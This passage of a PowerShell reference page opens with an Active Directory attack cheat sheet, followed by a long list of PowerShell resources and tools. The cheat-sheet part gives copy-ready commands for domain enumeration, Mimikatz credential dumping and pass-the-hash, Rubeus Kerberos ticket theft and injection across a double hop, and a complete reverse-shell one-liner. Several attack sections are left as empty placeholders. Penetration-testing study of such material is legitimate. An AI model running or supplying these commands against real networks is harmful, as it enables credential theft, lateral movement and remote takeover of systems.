Get-ADPrincipalGroupMembership -Identity student1
```
- List all the local groups on a machine (needs administrator privs on non-dc machines)
```powershell
Get-NetLocalGroup -ComputerName DC01.enumme.local -ListGroups
```
- Get members of all the local groups on a machine (needs administrator privs on non-dc machines)
```powershell
Get-NetLocalGroup -ComputerName DC01.enumme.local -Recurse
```
#### Logged
- Get actively logged users on a computer (needs local admin rights on the target)
```powershell
Get-NetLoggedon -ComputerName <servername>
```
- Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
```powershell
Get-LoggedonLocal -ComputerName DC01.enumme.local
```
- Get the last logged user on a computer (needs administrative rights and remote registry on the target)
```powershell
Get-LastLoggedOn -ComputerName <servername>
```
#### Share
- Find shares on hosts in current domain
```powershell
Invoke-ShareFinder -Verbose
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
```
- Find sensitive files on computers in the domain
```powershell
Invoke-FileFinder -Verbose
```
- Get all fileservers of the domain
```powershell
Get-NetFileServer
```
#### GPO
```powershell
# Get All GPO's
Get-GPO -All -Verbose | export-csv .\report_get-gpo_all_verbose.csv -Encoding utf8
```
- Get list of GPO in current domain
```powershell
Get-NetGPO
Get-NetGPO -ComputerName DC01.enumme.local
Get-GPO -All (GroupPolicy module)
Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html (Provides RSoP)
```
- Enumerate ACLs for all the GPOs
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
```
- Enumerate Restricted Groups from GPO
```powershell
Get-NetGPOGroup -Verbose
```
- Enumerate GPOs where target user or group have interesting permissions
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ?{$_.IdentityReference -match "target"}
```
- Membership of the Group "RDPUsers”
```powershell
Get-NetGroupMember -GroupName RDPUsers
```
- Get GPO(s) which use Restricted Groups or groups.xml for interesting users
```powershell
Get-NetGPOGroup
```
- Get users which are in a local group of a machine using GPO
```powershell
Find-GPOComputerAdmin -Computername srv.enumme.local
```
- Get machines where the given user is member of a specific group
```powershell
Find-GPOLocation -UserName john -Verbose
```
- GPO applied on the target OU
```powershell
(Get-NetOU targetmachine -FullData).gplink[LDAP://cn={x-x-x-x-x},cn=policies,cn=system,DC=target,DC=domain,DC=local;0]
Get-NetGPO -ADSpath 'LDAP://cn={x-x-x-x-x},cn=policies,cn=system,DC=target,DC=domain,DC=local'
```
#### OU
- Get OUs in a domain
```powershell
Get-NetOU -FullData
Get-ADOrganizationalUnit -Filter * -Properties *
```
- Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
```powershell
Get-NetGPO -GPOname "{x-x-x-x-x}"
Get-GPO -Guid x-x-x-x-x (GroupPolicy module)
```
- List all the computers in the target OU
```powershell
Get-NetOU targetcomputer | %{Get-NetComputer -ADSPath $_}
```
#### ACL
- Get the ACLs associated with the specified object
```powershell
Get-ObjectAcl -SamAccountName john -ResolveGUIDs
Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose
```
- Get the ACLs associated with the specified prefix to be used for search
```powershell
Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose
```
- We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs
```powershell
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=domain,DC=local').Access
```
- Get the ACLs associated with the specified LDAP path to be used for search
```powershell
Get-ObjectAcl -ADSpath "LDAP://CN=Domain
Admins,CN=Users,DC=domain,DC=local" -ResolveGUIDs -Verbose
```
- Search for interesting ACEs
```powershell
Invoke-ACLScanner -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "target"}
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "targetgroup"}
```
- Get the ACLs associated with the specified path
```powershell
Get-PathAcl -Path "\\DC01.domain.local\sysvol"
```
#### Domain Trusts
- Get a list of all domain trusts for the current domain
```powershell
Get-NetDomainTrust
Get-NetForestDomain -Verbose
Get-NetDomainTrust -Domain fr.k71.test.local
Get-ADTrust
Get-ADTrust -Identity fr.k71.test.local
```
- Get details about the current forest
```powershell
Get-NetForest
Get-NetForest -Forest domain.local
Get-ADForest
Get-ADForest -Identity domain.local
```
- Get all domains in the current forest
```powershell
Get-NetForestDomain
Get-NetForestDomain -Forest domain.local
(Get-ADForest).Domains
```
- Map all the trusts of the domain.local forest
```powershell
Get-NetForestDomain -Verbose | Get-NetDomainTrust
```
- Get all global catalogs for the current forest
```powershell
Get-NetForestCatalog
Get-NetForestCatalog -Forest domain.local
Get-ADForest | select -ExpandProperty GlobalCatalogs
```
- Map trusts of a forest
```powershell
Get-NetForestTrust
Get-NetForestTrust -Forest domain.local
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```
- List external trusts
```powershell
Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
```
if Bi-Directional trust we can extract information
--------------------------------------------------------------------------------------------------------------------------------------------
### Local Privilege Escalation
```powershell
ADD COMMANDS!
```
--------------------------------------------------------------------------------------------------------------------------------------------
### Local Account Stealing
```powershell
ADD COMMANDS!
```
--------------------------------------------------------------------------------------------------------------------------------------------
### Monitor Potential Incoming Account
```powershell
ADD COMMANDS!
```
--------------------------------------------------------------------------------------------------------------------------------------------
### Admin Recon
```powershell
ADD COMMANDS!
```
--------------------------------------------------------------------------------------------------------------------------------------------
### Lateral Movement
```powershell
# PowerShell Remoting
- Execute commands or scriptblocks
Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
- Execute scripts from files
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
- Execute locally loaded function on the remote machines
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
- A function call within the script is used
Invoke-Command -Filepath C:\path\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
- "Stateful" commands using Invoke-Command
$Sess = New-PSSession -Computername Server1
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
- Dump credentials on a local machine
Invoke-Mimikatz -DumpCreds
- Dump credentials on multiple remote machines
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
- Over pass the hash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:lab.domain.local /ntlm:<ntlmhash> /run:powershell.exe"'
- Invoke Mimikatz to create a token from user
$sess = New-PSSession -ComputerName target.domain.local
Enter-PSSession $sess
# EP BYPASS + AMSI BYPASS
exit
# PUSH LOCAL SCRIPT TO SESSION
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession $sess
# DUMPING
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
### Forwarder
# RULE
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.10.10.10 connectport=8080
# CHECK
netsh interface portproxy show all
# RESET
netsh interface portproxy reset
### KERBEROS DOUBLE HOPS - Remote ticket dumping - SMB Lateral Hosting (skill)
- You are logged in to ServerA.
- From ServerA, you start a remote PowerShell session to connect to ServerB.
- A command you run on ServerB via your PowerShell Remoting session attempts to access a resource on ServerC.<br>
:no_entry: Access to the resource on ServerC is denied, because the credentials you used to create the PowerShell Remoting session are not passed from ServerB to ServerC.<br>
:no_entry: Cannot encapsulate multiple psremoting session.<br>
:no_entry: Delegation not available.<br>
# LOGIN WITH COMPROMISED ACCOUNT
Invoke-Mimikatz -Command '"sekurlsa::pth /user:bob /domain:DOMAIN.LOCAL /ntlm:00000000000000000000000000000000 /run:powershell.exe"'
# PSREMOTE TO SERVER A
$servera = New-PSSession -ComputerName SERVERA.DOMAIN.LOCAL
Enter-PSSession -Session $servera
# PASS CREDENTIAL TO SERVER B
$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\alice', $SecPassword)
$serverb = New-PSSession -ComputerName SERVERB.DOMAIN.LOCAL -Credential $Cred
# LIST TICKET IN SERVER C:
Invoke-Command -ScriptBlock { & '\\10.10.10.10\c$\Users\jack\desktop\Rubeus.exe' klist} -Session $serverb | Select-String -Pattern Username
# DUMP TICKET IN SERVER C:
Invoke-Command -ScriptBlock { & '\\10.10.10.10\c$\Users\jack\desktop\Rubeus.exe' dump /user:targetadmin} -Session $serverb
# INJECT TICKET IN SERVER B:
Invoke-Command -ScriptBlock {& '\\10.10.10.10\c$\Users\jack\desktop\Rubeus.exe'  ptt /ticket:B64 } -Session $serverb
# CHECK INJECTION:
Invoke-Command -ScriptBlock { ls \\serverc\c$ } -Session $serverb
# RCE ON SERVER C:
Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {hostname} -ComputerName SERVERC.DOMAIN.LOCAL} -Session $serverb
# FINAL REVERSE SHELL IN SERVER A FROM SERVER C
Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {$client = New-Object System.Net.Sockets.TCPClient("servera",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -ComputerName SERVERC.DOMAIN.LOCAL} -Session $serverb 
```
--------------------------------------------------------------------------------------------------------------------------------------------
### Remote Administration
```powershell
ADD COMMANDS!
```
--------------------------------------------------------------------------------------------------------------------------------------------
### Domain Admin Privileges
```powershell
ADD COMMANDS!
```
--------------------------------------------------------------------------------------------------------------------------------------------
### Cross Trust Attacks
```powershell
ADD COMMANDS!
```
--------------------------------------------------------------------------------------------------------------------------------------------
### Persistance and Exfiltrate
```powershell
ADD COMMANDS!
```
--------------------------------------------------------------------------------------------------------------------------------------------
## API Wrapper
* [HipChatAdmin](https://github.com/cofonseca/HipChatAdmin) - A module for simple integration with Atlassian HipChat via the HipChat API.
* [PSGitHub](https://github.com/pcgeek86/PSGitHub) - Module contains commands to manage GitHub through its REST API.
* [Posh-GitHub](https://github.com/Iristyle/Posh-GitHub) - Cmdlets that expose the GitHub API.
* [Posh-Gist](https://github.com/dfinke/Posh-Gist) - Cmdlets for interacting with GitHub Gist.
* [PSGist](https://github.com/dotps1/PSGist) - A module to work with GitHub Gists.
* [PSAppVeyor](https://github.com/dotps1/PSAppVeyor) - A module to interact with the AppVeyor REST API.
* [PSSlack](https://github.com/RamblingCookieMonster/PSSlack) - Module for simple Slack integration.
* [ConfluencePS](https://atlassianps.org/module/ConfluencePS/) - A module for interacting with Atlassian's Confluence in powershell (by using the API).
* [JiraPS](https://atlassianps.org/module/JiraPS/) - A module for interacting with Atlassian's Jira in powershell (by using the API).
* [PSTelegramAPI](https://github.com/mkellerman/PSTelegramAPI) - Module for Telegram APIs
* [PSTeams](https://github.com/EvotecIT/PSTeams) - A module for sending formatted messages to a Microsoft Teams Channel.
* [PSURLScanio](https://github.com/sysgoblin/PSURLScanio) - A module for [urlscan.io](https://urlscan.io/) that is a service to scan and analyze websites.
--------------------------------------------------------------------------------------------------------------------------------------------
## Blogs
* [Windows PowerShell Blog](https://blogs.msdn.microsoft.com/powershell/) - Official PowerShell Team Blog.
* [Learn PowerShell | Achieve More](http://learn-powershell.net/) - Personal blog of Boe Prox who moderated for the Scripting Guy.
* [PowerShellMagazine](http://www.powershellmagazine.com/) - Awesome magazine.
* [PowerShellExplained](https://powershellexplained.com) - Personal blog of Kevin Marquette
* [Doug Finke](https://dfinke.github.io/#blog) - Author of [PowerShell for Developers](http://shop.oreilly.com/product/0636920024491.do).
* [Mike F. Robbins](http://mikefrobbins.com/) - Microsoft MVP. SAPIEN Tech MVP. Co-author of Windows PowerShell TFM 4th Edition.
* [Adam the Automator](https://adamtheautomator.com/) - Engaging, technical content on all things automation, cloud computing and DevOps by Adam Bertram and friends.
* [Clear-Script](https://vexx32.github.io/) - Personal blog of Joel (Sallow) Francis.
--------------------------------------------------------------------------------------------------------------------------------------------
## Books
* [Exploring PowerShell Automation](https://www.manning.com/books/exploring-powershell-automation) - a free eBook sampler that gives you an overview of how to administer your environment.
* [PowerShell in Depth](https://www.manning.com/books/powershell-in-depth) - The go-to reference for administrators. Every major shell technique, technology, and tactic is explained and demonstrated, providing a comprehensive reference to almost everything an admin would do in the shell.
* [Windows PowerShell in Action, Third Edition](https://www.manning.com/books/windows-powershell-in-action-third-edition) - The latest revision of the comprehensive reference guide.
* [Learn Windows PowerShell in a Month of Lunches, Third Edition](https://www.manning.com/books/learn-windows-powershell-in-a-month-of-lunches-third-edition) - An innovative tutorial designed for busy IT professionals. Just set aside one hour a day - lunchtime would be perfect - for a month, and you'll be automating Windows tasks faster than you ever thought possible.
* [Learn PowerShell in a Month of Lunches, Linux and macOS Edition](https://www.manning.com/books/learn-powershell-in-a-month-of-lunches-linux-and-macos-edition) - A task-focused tutorial for administering Linux and macOS systems using Microsoft PowerShell.
* [Learn PowerShell Scripting in a Month of Lunches](https://www.manning.com/books/learn-powershell-scripting-in-a-month-of-lunches) - A guide to the process of developing, testing, and deploying scripts, and the art of toolmaking.
* [The Monad Manifesto, Annotated - Jeffrey Snover](https://leanpub.com/s/4W-ob-YDw2LE2aSMyosCtA.pdf) - Design and theory behind the language from its creator.
* [Windows PowerShell Networking Guide](https://leanpub.com/windowspowershellnetworkingguide/read) - Language specific guide to Windows networking.
* [Why PowerShell? - Warren Frame & Don Jones](https://leanpub.com/s/aQDRwmoOi940mX_EB6N7Yg.pdf) - Use cases for the language.
* [The Big Book of PowerShell Gotchas - Don Jones](https://leanpub.com/s/lDl9ZV0QW7zaE4BpitXVig.pdf) - Excellent guide to avoiding common pitfalls.
* [The Big Book of PowerShell Error Handling - Dave Wyatt](https://leanpub.com/s/znHIFrvBAYRST5nFBiQU5g.pdf) - Great reference for error handling techniques.
* [Secrets of PowerShell Remoting](https://leanpub.com/s/DQLESXQ69TlVFQ9ogjrFLw.pdf) - On all things remoting. Workflow, fan-out, etc.
* [PowerShell Notes for Professionals](https://goalkicker.com/PowerShellBook/PowerShellNotesForProfessionals.pdf) - Compilation of notes and snippets.
* [PowerShell for SysAdmins: Workflow Automation Made Easy](https://nostarch.com/powershellsysadmins) - Learn how to manage and automate your desktop and server environments.
-------------------------------------------------------------------------------------------------------------------------------------------
## Build Tools
* [psake](https://github.com/psake/psake) - Build automation tool inspired by rake (aka make in Ruby) and bake (aka make in Boo).
* [Invoke-Build](https://github.com/nightroman/Invoke-Build) - Build and test automation tool inspired by psake.
* [PSDeploy](https://github.com/RamblingCookieMonster/PSDeploy) - Module built for the purpose of simplifying multiple types of deployments.
* [BuildHelpers](https://github.com/RamblingCookieMonster/BuildHelpers) - Variety of helper functions for CI/CD scenarios.
* [YDeliver](https://github.com/manojlds/YDeliver) - Build and deployment framework aimed at .NET projects.
-------------------------------------------------------------------------------------------------------------------------------------------
## Code and Package Repositories
* [GitHub](https://github.com/search?l=powershell&q=stars%3A%3E1&s=stars&type=Repositories) - Looking for an Open Source PowerShell project? It's probably here.
* [PowerShell Gallery](https://www.powershellgallery.com/) - Official PowerShell package repository, used by PowerShellGet.
* [PowerShell Test Gallery](https://www.poshtestgallery.com/) - A test version of the PowerShell Gallery. Useful when developing new modules.
-------------------------------------------------------------------------------------------------------------------------------------------
## Commandline Productivity
* [posh-git](https://github.com/dahlbyk/posh-git) - Set of PowerShell scripts which provide Git/PowerShell integration.
* [PSReadLine](https://github.com/lzybkr/PSReadLine) - Bash inspired readline implementation for PowerShell. Keeps history between sessions, adds reverse-history search and makes the commandline experience much better overall.
* [TabExpansionPlusPlus](https://github.com/lzybkr/TabExpansionPlusPlus) - PowerShell module to make customizing tab completion easier and add a library of custom argument completers.
* [Jump-Location](https://github.com/tkellogg/Jump-Location) - PowerShell `cd` that reads your mind. [Autojump](https://github.com/wting/autojump) implementation for PowerShell. **`UNMAINTAINED`**
* [Zlocation](https://github.com/vors/ZLocation) * [z.sh](https://github.com/rupa/z) implementation for PowerShell. Similar to Jump-Location.
* [thefuck](https://github.com/nvbn/thefuck) - Magnificent app which corrects your previous console command (by typing `fuck`).
* [pslinq](https://github.com/manojlds/pslinq) - LINQ (LINQ2Objects) for PowerShell.
* [posh-with](https://github.com/JanJoris/posh-with) - Command prefixing for continuous workflow using a single tool.
* [poco](https://gist.github.com/yumura/8df37c22ae1b7942dec7)* [peco](https://github.com/peco/peco) implementation. Interactive filtering tool.
* [PSDirTag](https://github.com/wtjones/PSDirTag) - DirTags are relative paths that appear as variables in the PowerShell prompt that update as you navigate. Saves keystrokes when navigating folder structures.
* [PSUtil](https://github.com/PowershellFrameworkCollective/PSUtil) - Designed to make the user's console life more convenient. It includes shortcuts, aliases, key bindings and convenience functions geared towards greater efficiency and less typing.
* [Microsoft.PowerShell.UnixCompleters](https://github.com/PowerShell/Modules/tree/master/Modules/Microsoft.PowerShell.UnixCompleters) - Get parameter completion for native Unix utilities. Requires zsh or bash.
* [PSDepend](https://github.com/RamblingCookieMonster/PSDepend/) - PowerShell Dependency Handler
* [PSScriptTools](https://github.com/jdhitsolutions/PSScriptTools) - A set of of PowerShell functions you might use to enhance your own functions and scripts or to facilitate working in the console.
* [zoxide](https://github.com/ajeetdsouza/zoxide) - A better way to navigate your filesystem. Written in Rust, cross-shell, and much faster than other autojumpers.
-------------------------------------------------------------------------------------------------------------------------------------------
## Communities
* [PowerShell.org](http://powershell.org/) - Forums, summits, community blog posts, and more.
* [/r/PowerShell](http://www.reddit.com/r/powershell) - Reddit PowerShell community.
* [Slack PowerShell team](https://poshcode.org/slack) - Large chat room dedicated to PowerShell. Bridged with `#PowerShell` on irc.freenode.net.
* [Research Triangle PowerShell User Group](https://www.meetup.com/Research-Triangle-PowerShell-Users-Group/) - Very active PowerShell and automation user group. Meets on first and third Wednesdays. All skill levels welcome.
-------------------------------------------------------------------------------------------------------------------------------------------
## Data
* [hjson-powershell](https://github.com/TomasBouda/hjson-powershell) - Simple powershell module for conversion between [HJSON](https://hjson.github.io/) and JSON.
* [ImportExcel](https://github.com/dfinke/ImportExcel) - Module to import/export Excel spreadsheets, without Excel.
* [powershell-yaml](https://github.com/cloudbase/powershell-yaml) - PowerShell CmdLets for YAML format manipulation.
* [PSWriteHTML](https://github.com/EvotecIT/PSWriteHTML) - PSWriteHTML is a PowerShell module allowing you to create HTML easily.
* [PSWritePDF](https://github.com/EvotecIT/PSWritePDF) - Module to create, edit, split, merge PDF files on Windows / Linux and MacOS.
* [PSWriteWord](https://github.com/EvotecIT/PSWriteWord) - Module to create Microsoft Word documents without Microsoft Word installed.
-------------------------------------------------------------------------------------------------------------------------------------------
## Documentation Helper
* [platyPS](https://github.com/PowerShell/platyPS) - Write PowerShell External Help in Markdown.
* [Invoke-CreateModuleHelpFile](https://github.com/gravejester/Invoke-CreateModuleHelpFile) - PowerShell function to create a HTML help file for a module and all it's commands.
* [PScribo](https://github.com/iainbrighton/PScribo) - PowerShell documentation framework what can create HTML, Word, text files based on PowerShell-based DSL (domain specific language).
-------------------------------------------------------------------------------------------------------------------------------------------
## Editors and IDEs
* [PowerShell Studio](https://www.sapien.com/software/powershell_studio) - Powerful PowerShell IDE with module, help, and user interface development tools, high DPI support and regular updates.
* [PowerShell for Visual Studio Code](https://marketplace.visualstudio.com/items?itemName=ms-vscode.PowerShell) - Provides IntelliSense, code navigations, script analysis, script debugging, and more for the [Visual Studio Code](https://code.visualstudio.com) editor.
* [PoshTools for Visual Studio](https://ironmansoftware.com/powershell-tools-for-visual-studio/) - Provides IntelliSense, script debugging, and Pester testing support for PowerShell to Visual Studio.
* [PowerShell ISE](https://docs.microsoft.com/en-us/powershell/scripting/components/ise/introducing-the-windows-powershell-ise) - Official PowerShell development environment included with Microsoft Windows.
* [ISE Steroids](http://www.powertheshell.com/isesteroids/) - Add-on for the PowerShell ISE which provides a rich set of additional features to complete the ISE development experience.
* [PowerShell Plus](https://www.idera.com/productssolutions/freetools/powershellplus) - All in one IDE.
* [SublimeText package](https://github.com/SublimeText/PowerShell) - PowerShell language support for Sublime Text.
* [Atom package](https://github.com/jugglingnutcase/language-powershell) - PowerShell language support for Atom.
-------------------------------------------------------------------------------------------------------------------------------------------
## Frameworks
* [Carbon](http://get-carbon.org/) - DevOps for automating the configuration of Windows computers.
* [PowerShell PowerUp](https://github.com/janikvonrotz/PowerShell-PowerUp) - Powerful server management framework.
* [PSCX](https://github.com/Pscx/Pscx) - PowerShell Community Extensions - Useful set of additional cmdlets.
* [PSFramework](https://github.com/PowershellFrameworkCollective/psframework) - Easily add configurations, logging and more to your own PowerShell module.
* [Kansa](https://github.com/davehull/Kansa) - Incident response framework.
-------------------------------------------------------------------------------------------------------------------------------------------
## Interactive Learning
* [PSKoans](https://github.com/vexx32/PSKoans) - A simple, fun, and interactive way to learn the PowerShell language through Pester unit testing.
* [Jupyter-PowerShell](https://github.com/Jaykul/Jupyter-PowerShell) - Jupyter Kernel for PowerShell.
-------------------------------------------------------------------------------------------------------------------------------------------
## Logging
* [PoShLog](https://github.com/PoShLog/PoShLog) - Cross-platform, extensible logging module built upon [Serilog](https://serilog.net).
-------------------------------------------------------------------------------------------------------------------------------------------
## Module Development Templates
* [Plaster](https://github.com/PowerShell/Plaster) - Plaster is a template-based file and project generator written in PowerShell.
* [PSModuleDevelopment](https://github.com/PowershellFrameworkCollective/PSModuleDevelopment) - Get started using module templates in 2 minutes with this module's low entry barrier and casual convenience.
* [Catesta](https://github.com/techthoughts2/Catesta) - Catesta is a PowerShell module project generator. It uses templates to rapidly scaffold test and build integration for a variety of CI/CD platforms.
-------------------------------------------------------------------------------------------------------------------------------------------
## Package Managers
* [PowerShellGet](https://github.com/powershell/powershellget) - PowerShellGet is the Package Manager for PowerShell. Packages are available on [PowerShellGallery](https://www.PowerShellGallery.com).
* [Chocolatey](https://chocolatey.org/) - The package manager for Windows. The sane way to manage software on Windows.
* [GitLab](https://github.com/akamac/GitLabProvider) - Use a GitLab server as Package Provider.
* [Scoop](https://scoop.sh) - A command-line installer for Windows.
* [PowerShell App Deployment Toolkit](https://psappdeploytoolkit.com/) - Provides a set of functions to perform common application deployment tasks and to interact with the user during a deployment.
-------------------------------------------------------------------------------------------------------------------------------------------
## Parallel Processing
* [PoshRSJob](https://github.com/proxb/PoshRSJob) - Provides an alternative to PSJobs with greater performance and less overhead to run commands in the background.
* [Invoke-Parallel](https://github.com/RamblingCookieMonster/Invoke-Parallel) - This function will take in a script or scriptblock, and run it against specified objects(s) in parallel.
* [PSThreadJob](https://github.com/PaulHigin/PSThreadJob) - Module for running concurrent jobs based on threads rather than processes.
-------------------------------------------------------------------------------------------------------------------------------------------
## Podcasts
* [PowerScripting](https://powershell.org/category/podcast/) - Weekly show run by Jon Walz and Hal Rottenberg.
* [The PowerShell News Podcast](https://powershellnews.podbean.com/) - This podcast is the latest news on PowerShell.
-------------------------------------------------------------------------------------------------------------------------------------------
## Security
* [File System Security](https://gallery.technet.microsoft.com/scriptcenter/1abd77a5-9c0b-4a2b-acef-90dbb2b84e85) - Allows a much easier management of permissions on files and folders.
* [PowerShellArsenal](https://github.com/mattifestation/PowerShellArsenal) - Module used to aid a reverse engineer.
* [PowerTools](https://github.com/Veil-Framework/PowerTools) - Collection of projects with a focus on offensive operations.
* [PowerForensics](https://github.com/Invoke-IR/PowerForensics) - Popular live disk forensics platform for windows.
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) - Post-exploitation framework.
* [PowerShellEmpire](https://github.com/PowerShellEmpire/Empire) - Post-exploitation agent.
* [PSReflect](https://github.com/mattifestation/PSReflect) - Easily define in-memory enums, structs, and Win32 functions in PowerShell. Useful for attacks, [example](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC).
* [BloodHound](https://github.com/BloodHoundAD/BloodHound) - Easily identify highly complex attack paths that would otherwise be impossible to quickly identify.
* [Nishang](https://github.com/samratashok/nishang) - Enables scripting for red team, penetration testing, and offensive security.
* [Harness](https://github.com/Rich5/Harness) - Interactive remote PowerShell Payload.
* [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) - PowerShell Obfuscator.
* [p0wnedShell](https://github.com/Cn33liz/p0wnedShell) - PowerShell Runspace Post Exploitation Toolkit.
* [PESecurity](https://github.com/NetSPI/PESecurity) - Module to check if a Windows binary (EXE/DLL) has been compiled with ASLR, DEP, SafeSEH, StrongNaming, and Authenticode.
* [Powershellery](https://github.com/nullbind/Powershellery) - Powershell scripts used for general hackery.
* [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) - Toolkit for Attacking SQL Server.
-------------------------------------------------------------------------------------------------------------------------------------------
## SharePoint
* [AutoSPInstaller](https://autospinstaller.com/) - Automated SharePoint 2010-2019 installation script.
* [Client-side SharePoint](https://sharepointpowershell.codeplex.com/) - API for SharePoint 2010, 2013 and Online.
* [SPReplicator](https://github.com/potatoqualitee/SPReplicator) - SPReplicator helps replicate SharePoint list data to/from CSV, SQL Server, SharePoint itself and more.
-------------------------------------------------------------------------------------------------------------------------------------------
## SQL Server
* [dbatools](https://dbachecks.io) - Helps SQL Server Pros be more productive with instance migrations and much more.
* [SimplySql](https://github.com/mithrandyr/SimplySql) - SimplySql is a module that provides an intuitive set of cmdlets for talking to databases that abstracts the vendor specifics. The basic pattern is to connect to a database, execute one or more sql.
-------------------------------------------------------------------------------------------------------------------------------------------
## Testing
* [Pester](https://github.com/pester/Pester) - PowerShell BDD style testing framework.
* [Format-Pester](https://github.com/equelin/format-pester) - PowerShell module for documenting Pester's results - exports Pester results to HTML, Word, text files using [PScribo](https://github.com/iainbrighton/PScribo).
* [Selenium](https://github.com/adamdriscoll/selenium-powershell) - PowerShell module to run a Selenium WebDriver.
* [PSScriptAnalyzer](https://github.com/PowerShell/PSScriptAnalyzer) - PSScriptAnalyzer provides script analysis and checks for potential code defects in the scripts by applying a group of built-in or customized rules on the scripts being analyzed.
-------------------------------------------------------------------------------------------------------------------------------------------
## Themes
* [Oh-My-Posh](https://github.com/jandedobbeleer/oh-my-posh) - Tons of beautiful theme that can be enabled by one single command (includes many awesome powerline theme).
* [PoshColor](https://github.com/JustABearOz/PoshColor) - Colour output from common commands with support for custom themes.
* [Powerline](https://github.com/Jaykul/PowerLine) - PowerShell Classes for richer output and prompts.
* [Starship](https://github.com/starship/starship) - The minimal, blazing fast, and extremely customizable prompt for any shell.
-------------------------------------------------------------------------------------------------------------------------------------------
## UI
* [AnyBox](https://github.com/dm3ll3n/AnyBox) - Designed to facilitate script input/output with an easily customizable WPF window.
* [BurntToast](https://github.com/Windos/BurntToast) - Module for creating and displaying Toast Notifications on Microsoft Windows 10.
* [Graphical](https://github.com/PrateekKumarSingh/graphical) - Module to plot colorful console 2D Graphs (Scatter, Bar, Line).
* [GraphicalTools](https://github.com/PowerShell/GraphicalTools) - A module that mixes PowerShell and GUIs! - built on Avalonia and gui.cs.
* [PS-Menu](https://github.com/chrisseroka/ps-menu) - Simple module to render interactive console menu.
* [PSWriteColor](https://github.com/EvotecIT/PSWriteColor) - Write-Color is a wrapper around Write-Host allowing you to create nice looking scripts, with colorized output.
* [Terminal-Icons](https://github.com/devblackops/Terminal-Icons) - Module to show file and folder icons in the terminal.
* [psInlineProgress](https://github.com/gravejester/psInlineProgress) - Write inline progress bars in PowerShell.
-------------------------------------------------------------------------------------------------------------------------------------------
## Videos
* [PowerShell Unplugged with Jeffrey Snover and Don Jones Ignite 2017](https://www.youtube.com/watch?v=D15vh-ryJGk) - The inventor of PowerShell talking about "the latest and coolest PowerShell features to help you automate and manage the hybrid cloud". Focused on the PowerShell Community.
* [Getting Started With PowerShell 3.0 Jump Start](https://mva.microsoft.com/en-US/training-courses/getting-started-with-powershell-30-jump-start-8276) - Jump starts series are for IT professionals with no previous experience with PowerShell, and want to learn it fast.
* [Advanced Tools & Scripting with PowerShell 3.0](https://channel9.msdn.com/Series/advpowershell3) - IT pros, take this advanced PowerShell course to find out how to turn your real time management and automation scripts into useful reusable tools and cmdlets.
* [What's New in PowerShell v5](https://mva.microsoft.com/en-US/training-courses/whats-new-in-powershell-v5-16434) - Through description on some of the exciting new features in PowerShell version 5.0.
* [PowerShell Open Source Project](https://channel9.msdn.com/series/PowerShell-Open-Source-Project) - Collection of videos thoroughly demonstrate how PowerShell open source project runs on Linux.
* [PowerShell on Linux and Open Source](https://channel9.msdn.com/Blogs/hybrid-it-management/PowerShell-on-Linux-and-Open-Source) - Brief introduction to PowerShell open source project and how it runs on Linux.
* [PowerShell](https://channel9.msdn.com/Shows/MsftPowerShell) - This show will include videos talking about the PowerShell automation platform, Desired State Configuration (DSC), infrastructure as code, and related concepts!! These videos are created by Trevor Sullivan, a Microsoft MVP for Windows PowerShell.
* [Learn Windows PowerShell in a Month of Lunches - Don Jones](https://www.youtube.com/watch?v=6CRTahGYnws&list=PL6D474E721138865A) - Video companion to the book of the same title.
* [Best Practices for Script Design - Don Jones](https://www.youtube.com/watch?v=Lni4KjGMgu4) - Don Jones discusses script design principles and best practices.
* [PowerShell Toolmaking (1 of 3) - Don Jones](https://www.youtube.com/watch?v=KprrLkjPq_c) - Toolmaking (1 of 3) - Don Jones.
